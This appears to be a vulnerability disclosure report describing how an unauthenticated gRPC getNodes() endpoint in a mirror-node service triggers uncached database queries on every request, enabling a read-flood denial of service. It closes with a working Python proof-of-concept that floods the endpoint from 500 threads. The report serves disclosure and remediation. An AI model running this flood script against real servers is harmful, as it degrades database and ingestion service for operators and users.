### Title
Unauthenticated gRPC `getNodes()` Triggers Uncached Database Queries Per Request, Enabling Read-Flood DoS

### Summary
The `getNodes()` endpoint in `NetworkController` requires no authentication and has no per-IP or global request rate limit. Every invocation unconditionally executes two uncached `SELECT MAX(...)` database queries regardless of caching on downstream calls. An attacker opening many connections and calling `getNodes(limit=1)` in a tight loop can flood the database with read queries, exhausting connection pool capacity and degrading write throughput for the importer.

### Finding Description

**Exact code path:**

`NetworkController.getNodes()` (line 33–43) accepts any unauthenticated request and delegates directly to `NetworkServiceImpl.getNodes()`.

Inside `NetworkServiceImpl.getNodes()` (lines 61–65):

```java
long addressBookTimestamp = addressBookRepository
        .findLatestTimestamp(fileId.getId())          // line 61-62 — NOT cached
        .orElseThrow(() -> new EntityNotFoundException(fileId));
long nodeStakeTimestamp = nodeStakeRepository
        .findLatestTimestamp()                         // line 64 — NOT cached
        .orElse(NODE_STAKE_EMPTY_TABLE_TIMESTAMP);
var nodeStakeMap = nodeStakeRepository
        .findAllStakeByConsensusTimestamp(nodeStakeTimestamp); // line 65 — @Cacheable
```

`AddressBookRepository.findLatestTimestamp()` issues `SELECT MAX(start_consensus_timestamp) FROM address_book WHERE file_id = ?` with no `@Cacheable` annotation.

`NodeStakeRepository.findLatestTimestamp()` issues `SELECT MAX(consensus_timestamp) FROM node_stake` with no `@Cacheable` annotation.

`findAllStakeByConsensusTimestamp` and `findByConsensusTimestampAndNodeId` are cached, but the two `findLatestTimestamp` calls are not — they execute on **every single request**.

**Root cause:** The two `findLatestTimestamp` queries are used as cache-key lookups to feed the downstream cached calls, but are themselves never cached. This means every `getNodes()` call, regardless of frequency, hits the database at least twice.

**Why existing checks fail:**

- `maxConcurrentCallsPerConnection = 5` (in `NettyProperties`) limits concurrent calls *per connection*, but there is no limit on the number of connections from a single IP and no global request rate limiter on the gRPC module. The `ThrottleConfiguration`/`ThrottleManagerImpl` rate limiter exists only in the `web3` module.
- `AddressBookFilter` validates `limit >= 0` but places no minimum on it, so `limit=1` is fully valid.
- The `@Cacheable` on `findAllStakeByConsensusTimestamp` and `findByConsensusTimestampAndNodeId` does not protect the two uncached `MAX` queries that precede them.

### Impact Explanation
Each `getNodes(limit=1)` call completes in milliseconds (returns one node entry from cache), allowing an attacker to immediately issue the next request. With N connections × 5 concurrent calls, the attacker sustains 5N simultaneous `SELECT MAX(...)` queries against the database at all times. This exhausts the database connection pool shared with the importer, increases query latency, and under sufficient load can cause the importer's write transactions to time out or queue indefinitely, delaying ingestion of new consensus data.

### Likelihood Explanation
No credentials, API keys, or special network access are required — the gRPC port (default 5600) is publicly reachable. A single attacker machine can open hundreds of TCP connections and saturate the endpoint. The attack is trivially scriptable with any gRPC client library and is fully repeatable.

### Recommendation
1. **Cache `findLatestTimestamp` calls**: Apply `@Cacheable` with a short TTL (e.g., 1–2 seconds) to both `AddressBookRepository.findLatestTimestamp()` and `NodeStakeRepository.findLatestTimestamp()` using the existing cache infrastructure in `CacheConfiguration`.
2. **Add a global gRPC rate limiter**: Introduce a server-side `ServerInterceptor` that enforces a per-IP or global request rate limit for `getNodes()`, analogous to the `ThrottleManagerImpl` used in the `web3` module.
3. **Limit total connections**: Configure `NettyServerBuilder` with `maxConnectionsTotal` or use an ingress-level rate limiter to cap connections per source IP.

### Proof of Concept

```python
import grpc
import threading
from hedera.mirror.api.proto import network_service_pb2_grpc
from com.hedera.mirror.api.proto import mirror_pb2

TARGET = "mirror-node-grpc-host:5600"
NUM_CONNECTIONS = 100
CALLS_PER_CONNECTION = 5

def flood(stub):
    while True:
        try:
            req = mirror_pb2.AddressBookQuery(limit=1)
            list(stub.getNodes(req))  # completes fast, immediately loops
        except Exception:
            pass

stubs = []
for _ in range(NUM_CONNECTIONS):
    channel = grpc.insecure_channel(TARGET)
    stubs.append(network_service_pb2_grpc.NetworkServiceStub(channel))

threads = []
for stub in stubs:
    for _ in range(CALLS_PER_CONNECTION):
        t = threading.Thread(target=flood, args=(stub,), daemon=True)
        t.start()
        threads.append(t)

for t in threads:
    t.join()
```

Each iteration of the loop triggers two uncached `SELECT MAX(...)` queries. With 100 connections × 5 threads = 500 concurrent tight-loop callers, the database receives a continuous flood of read queries with no server-side throttle to stop them.
